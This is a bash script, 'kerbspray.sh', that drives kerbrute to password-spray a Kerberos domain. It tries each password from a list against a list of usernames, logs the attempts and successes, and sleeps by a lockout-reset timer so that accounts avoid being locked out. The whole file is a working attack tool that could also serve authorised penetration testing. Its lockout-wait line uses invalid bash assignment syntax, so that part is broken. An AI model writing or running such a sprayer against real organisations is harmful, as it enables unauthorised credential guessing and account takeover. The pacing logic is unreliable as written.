
#!/bin/bash
if [ $# -lt 5 ] ; then
    echo "Not Enough Arguments"
    echo "Useage: kerbspray.sh <domain> <usernameList> <passwordList> <LockoutThreshold> <LockoutResetTimerInMinutes>"
    echo -e "Example: kerbspray.sh domain.ca users.txt passwords.txt 2 60\n"
    exit 0
else
    mkdir -p logs
    userslist="logs/username-removed-successes.txt"
    domain=$1
    users=$2
    passwordlist=$3
    lockout=$4
    lockoutduration=$(($5 * 60))
    counter=0
    index=1
    touch logs/spray-logs.txt

    #Then start on list
    for password in $(cat $passwordlist); do
        time1=$(date +%H:%M:%S)
        date1=$(date +%Y/%m/%d)
        echo "$date1 $time1 Spraying with password: $password"
        echo "$date1 $time1 - $password" >> logs/spray-logs.txt

        kerbrute passwordspray -d $domain $users $password -o logs/pwspray_${index}.txt --safe --threads 1

        index=$(($index + 1))
        counter=$(($counter + 1))
        if [ $counter -eq $lockout ] ; then
            templockout = $lockoutduration
            echo "Reached lockout: $lockout, sleeping for $templockout"
            counter=0
            while [ $templockout -gt 0 ]; do
                echo -ne "  $templockout\033[0K\r"
                sleep 1
                : $((templockout--))
            done
        fi
    done
fi

